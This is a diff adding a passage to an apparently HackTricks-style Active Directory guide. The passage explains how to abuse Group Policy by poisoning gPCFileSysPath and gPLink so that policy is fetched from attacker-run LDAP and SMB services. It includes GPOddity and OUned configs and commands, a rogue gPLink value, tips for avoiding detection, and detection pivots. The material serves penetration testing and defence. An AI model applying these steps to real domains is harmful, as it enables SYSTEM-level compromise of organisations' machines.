@@ -261,6 +261,54 @@ The XML configuration file for Users and Groups outlines how these changes are i
 
 Furthermore, additional methods for executing code or maintaining persistence, such as leveraging logon/logoff scripts, modifying registry keys for autoruns, installing software via .msi files, or editing service configurations, can also be considered. These techniques provide various avenues for maintaining access and controlling target systems through the abuse of GPOs.
 
+### Redirecting GPC/GPT retrieval to authenticated rogue services
+
+A GPO consists of an LDAP **Group Policy Container (GPC)** with metadata and an SMB-hosted **Group Policy Template (GPT)** with the policy files. During refresh, the client follows the container's `gPLink`, reads the referenced GPC and its `gPCFileSysPath`, then downloads the GPT from that UNC path. Consequently, write access to either the GPC itself or the `gPLink` of an OU, Site or Domain can be converted into privileged policy processing.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+
+#### `gPCFileSysPath` poisoning with GPOddity
+
+If the controlled principal can write the target GPC (directly or through **NTLM relay to LDAP**), replace `gPCFileSysPath` with a UNC path hosted by the attacker. [GPOddity](https://github.com/synacktiv/GPOddity) automates the LDAP change and serves a malicious GPT containing module-based policy files or an Immediate Task that the Group Policy client executes as `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>
+
+An anonymous or credential-agnostic SMB share is not sufficient on current Windows clients: SMB Secure Negotiate requires proof that authentication succeeded, so the rogue service must validate the domain identity, derive the SMB session key and correctly sign its responses. In embedded mode, configure GPOddity with a controlled machine account and its service key, then select a computer- or user-side payload in the `[COMMANDS]` section.<sup>[[15]](#references)[[16]](#references)</sup>
+
+```ini
+[SMB]
+smb-mode=embedded
+smb-machine=SCAPY$
+smb-ip=<attacker_ip>
+smb-nt=<machine_nt_hash>
+smb-share=gpoddity
+smb-iface=eth0
+```
+
+```bash
+python3 gpoddity.py --config config.ini -v
+```
+
+**User GPO edge case:** after MS16-072, Windows still creates two SMB2 sessions in the **same TCP connection**: the user session reads `GPT.INI`, then the computer-account session reads effective configuration such as `ScheduledTasks.xml`. A rogue server must therefore index authentication state, session keys and signing keys by SMB2 `SessionId`, not only by socket. The Scapy fork embedded in GPOddity/OUned implements this through `SMBStreamSocketMultiplexing` and a multiplexing-aware `SMBServer`; single-session Impacket/Scapy servers otherwise reuse the wrong signing state and fail on user policies.<sup>[[15]](#references)</sup>
+
+#### `gPLink` poisoning with OUned
+
+With `WriteGPLink`, `GenericWrite` or equivalent control over an OU, Site or Domain, an attacker can append a link whose GPC DN is served by an attacker-controlled LDAP host. This primitive was originally presented by Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automates the LDAP write and the malicious GPC/GPT chain.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>
+
+```text
+[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
+```
+
+The victim first authenticates to the rogue LDAP service and receives a GPC whose `gPCFileSysPath` points to the rogue SMB service; it then authenticates to SMB and applies the supplied GPT. OUned therefore needs an account with an LDAP SPN, a machine account with a HOST SPN for SMB (the same machine account can satisfy both), and DNS resolution or reverse forwarding that sends ports 389 and 445 to the operator host.<sup>[[15]](#references)[[17]](#references)</sup>
+
+```bash
+python3 OUned.py --config config.ini -v
+```
+
+OUned's embedded Scapy LDAP server validates Kerberos/SPNEGO with the real controlled service key and serves arbitrary GPC data from JSON. The empty JSON key models rootDSE, `base64:` prefixes represent binary values, and the server supports add/delete/modify/search plus `BASE`, `LEVEL` and `SUBTREE` searches; it can negotiate no protection, integrity or confidentiality. This makes the service reusable when another Windows component follows an attacker-controlled LDAP reference but insists on authenticated LDAP.<sup>[[15]](#references)</sup>
+
+Do not assume that synchronizing an account password into a dummy domain reproduces every Kerberos key: RC4 derives from the password, whereas AES string-to-key also uses a salt derived from the principal's hostname/domain. Supplying the actual account AES key to `KerberosSSP` avoids forcing RC4 through a detectable change to the machine account's self-writable `msDS-SupportedEncryptionTypes`.<sup>[[15]](#references)</sup>
+
+#### Detection pivots
+
+Correlate changes to `gPCFileSysPath` or `gPLink` with GPO version changes and new Immediate/Scheduled Task XML. Investigate links to unexpected naming contexts, UNC hosts outside the approved DC/SYSVOL set, DNS records redirecting machine-account names, LDAP/CIFS service tickets for unusual machine accounts, and `msDS-SupportedEncryptionTypes` changes that enable RC4.<sup>[[15]](#references)</sup>
+
 ### WriteGPLink + UNC path hijacking (ARP spoofing)
 
 `WriteGPLink` over an OU/domain lets you modify the target container's `gPLink` attribute and **force an existing GPO to apply** without editing the GPO itself. This becomes interesting when the linked GPO already references remote content over **UNC paths** (`\\HOST\share\...`), because authenticated users can read **SYSVOL** and hunt for reusable policies offline.<sup>[[11]](#references)</sup>
@@ -400,5 +448,11 @@ Notes:
 - [9] [Samba – net rpc (group membership)](https://www.samba.org/)
 - [10] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
 - [11] [TrustedSec - ARP Around and Find Out: Hijacking GPO UNC Paths for Code Execution and NTLM Relay](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
+- [12] [GPOddity: exploiting Active Directory GPOs through NTLM relaying, and more](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
+- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
+- [14] [OUned.py: exploiting hidden Organizational Units ACL attack vectors in Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
+- [15] [Simulating legitimate Active Directory services on the network: the case of GPO exploitation](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
+- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
+- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
 
 {{#include ../../../banners/hacktricks-training.md}}
